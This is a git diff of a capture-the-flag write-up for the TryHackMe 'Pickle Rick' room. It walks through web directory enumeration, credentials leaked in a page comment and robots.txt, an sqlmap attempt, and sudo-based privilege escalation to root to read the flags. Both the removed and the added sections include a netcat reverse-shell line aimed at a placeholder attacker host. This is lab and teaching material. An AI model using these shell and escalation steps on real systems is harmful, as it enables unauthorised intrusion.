@@ -1,50 +1,88 @@
 ---
-description: LAST UPDATED FEB-2025 (p.s. pardon me, I'm still a rookie at CTFs)
+description: LAST UPDATED 23-MAY-2025
 ---
 
 # Pickle Rick
 
 {% embed url="https://tryhackme.com/room/picklerick" %}
 
-Upon reading the source code in `http://10.10.253.172/`, I found the username `R1ckRul3s` within the comments.
+## Manual Inspection
 
-...
+When I visited the webpage I was greeted with  a note that relates to the theme of the CTF. However, there seem to be nothing interesting or relevant to the technical details of the machine.
 
-```bash
-gobuster dir -u ... -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
-...
-/assets
-/robots.txt
-/.htaccess
-/.htpasswd
-...
-```
+Next, I used the Chrome developer tools to inspect the source code, and I found the following comment:
 
-...
+`Note to self, rememberusername!`&#x20;
 
-From `/robots.txt`:
+`Username: R1ckRul3s`
 
-`Wubbalubbadubdub`
+This tells me that there exists a username `R1ckRul3s`.
 
-...
 
-```bash
-$ ffuf -u http://<target>/FUZZ.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
-/login.php
-/portal.php
-...
-```
 
-...
+## Directory Enumeration
+
+The wordlists used in this section are present in the root directory: `/usr/share/wordlists/SecLists/Discovery/Web-Content`&#x20;
+
+{% embed url="https://github.com/danielmiessler/SecLists" %}
+
+_**(1) Basic discovery**_
+
+1. _**common.txt**_
 
 ```bash
-$ ffuf -h -u http://<target>/FUZZ -w .../Apache_common.txt
-/login.php
-/portal.php
-... 
+gobuster dir -u ... -w .../common.txt
 ```
 
-I visited the path `/login.php` , and was presented with a login page. I utilized the information we have gathered earlier to discover the username and password combination of `R1ckRul3s` and `Wubbalubbadubdub` respectively.
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+From the results, it appears that the `/robots.txt` path exists. Upon visiting, it returns:
+
+`Wubbalubbadubdub`&#x20;
+
+Seems like a strange text, could it be another username, a clue, or perhaps a password? We will leave it here for now.
+
+
+
+_**(2) Enumerating PHP**_
+
+PHP is commonly used as the underlying programming language or an Apache web server. Thus, I decided to enumerate common PHP filenames and directories. Note that the commands listed below are similar to the ones used in the first part above, just with addition of flags, and change of wordlist.
+
+1. _common.txt_
+
+```bash
+$ gobuster dir -u http://<target> -x php -w .../common.txt
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+
+
+2. _Common-PHP-Filenames.txt_
+
+```bash
+$ gobuster dir -u http://<target> -w .../Common-PHP-Filenames.txt
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+It appears that we have found a few `.php` files such as `login.php`, `portal.php` and `denied.php`. This is a strong indicator the web server is running PHP.
+
+
+
+_**The****&#x20;****`ffuf`****&#x20;****tool can be used too:**_
+
+```bash
+# 1)
+$ ffuf -u http://<target>/FUZZ.php -w .../common.txt
+
+# 2)
+$ ffuf -u http://<target>/FUZZ -w .../Common-PHP-Filenames.txt
+```
+
+***
+
+Next, I visited the path `/login.php` , and was presented with a login page. I utilized the information we have gathered earlier to discover the username and password combination of `R1ckRul3s` and `Wubbalubbadubdub` respectively.
 
 **Enumerating the webpage**
 
@@ -58,7 +96,9 @@ This is a string that has been base64-encoded multiple times. The plaintext valu
 
 The main interface presented an input form that accepts commands for a Linux environment. This form will be used to enumerate the Linux system and find the ingredients.
 
-### First ingredient
+
+
+## First Ingredient
 
 ```bash
 $ cat Sup3rS3cretPickl3Ingred.txt # does not work
@@ -67,7 +107,9 @@ $ less Sup3rS3cretPickl3Ingred.txt # WORKS!
 mr. meeseek hair
 ```
 
-### Second ingredient
+
+
+## Second Ingredient
 
 ```bash
 $ ls /home
@@ -76,25 +118,25 @@ rick ubuntu
 $ ls /home/rick
 second ingredients
 
-$ less '/home/rick/second ingredients' # 'more' and 'cat' disable
+$ less '/home/rick/second ingredients' # 'more' and 'cat' disabled
 1 jerry tear
 ```
 
-### Third ingredient
+
+
+## Third Ingredient
 
 I was having difficulty finding the third ingredient from the file system, as most of my attempts at enumerating the directories returned an empty response. Thus, I decided to further enumerate the webpage.
 
 Upon visiting `/denied.php` ,
 
-We are presented with a message: "Only the REAL rick can view this page." This made me wonder, by _REAL rick_, does this mean we have to somehow access this page via the root account?
+We are presented with a message: "_Only the REAL rick can view this page._" This made me wonder, by _REAL rick_, does this mean we have to somehow access this page via the root account?
 
-**SQL Injection attempt**
+### Privilege Escalation&#x20;
+
+**(1) SQL Injection attempt**
 
 I attempted a SQL injection attack on the login form, in hopes of potentially discovering the name and password combination of the root, or higher privilege account.
-
-```sql
-...
-```
 
 ```bash
 $ sqlmap -u http://<target>:[port] --data "username=random&password=random&sub=Login" --risk ... -- ... --batch
@@ -103,27 +145,9 @@ $ sqlmap -u http://<target>:[port] --data "username=random&password=random&sub=L
 
 The database used in the system seems to either not use an SQL-based database, or is simply not vulnerable to a SQL injection attack.
 
-I decided to focus my efforts back on the shell environment presented in the interface. To provide myself with a more stable shell experience, I tried to establish a remote shell environment through a few methods: reverse shell and SSH connection.
-
-**Attempts to initiate a reverse shell**
-
-```bash
-$ perl ... # perl
-$ ... # bash
-$ ... # python
-$ nc <attacker> [port] -e /bin/sh # netcat
-```
-
-\
-**Attempt to add a new SSH authorized key**&#x20;
-
-```bash
-$ ...
-```
-
 As mentioned before, access to the third ingredient most likely requires a privileged account. Thus, I attempted to escalate my privileges.
 
-**Linux privilege escalation enumeration**
+**(2) Linux privilege escalation enumeration**
 
 ```bash
 $ id
@@ -142,19 +166,15 @@ User www-data may run the following commands on ip-10-10-49-150:
     
 ```
 
-**Attempts at abusing my `sudo` privileges to view system logs**
+**2.1 Gaining a root shell**
 
 ```bash
-$ sudo less /var/log/syslog
-...
-
-===
-
+$ sudo su root
 ```
 
-**Finding the last and final ingredient**
+**2.2 Finding the last and final ingredient**
 
-Well, it turns out, the 3rd ingredient is not hidden within any log files, but simply in the `/root` directory.&#x20;
+After further enumeration on the file system as te, it turns out, the 3rd ingredient is not hidden within any log files, but simply in the `/root` directory.&#x20;
 
 ```bash
 $ sudo ls -la /root
@@ -164,4 +184,24 @@ $ sudo ls -la /root
 
 $ sudo less /root/3rd.txt
 fleeb juice
+```
+
+
+
+### Additional pointers
+
+**(1) Attempts to initiate a reverse shell**
+
+```bash
+$ perl ... # perl
+$ ... # bash
+$ ... # python
+$ nc <attacker> [port] -e /bin/sh # netcat
+```
+
+\
+**(2) Attempt to add a new SSH authorized key**&#x20;
+
+```bash
+$ ...
 ```
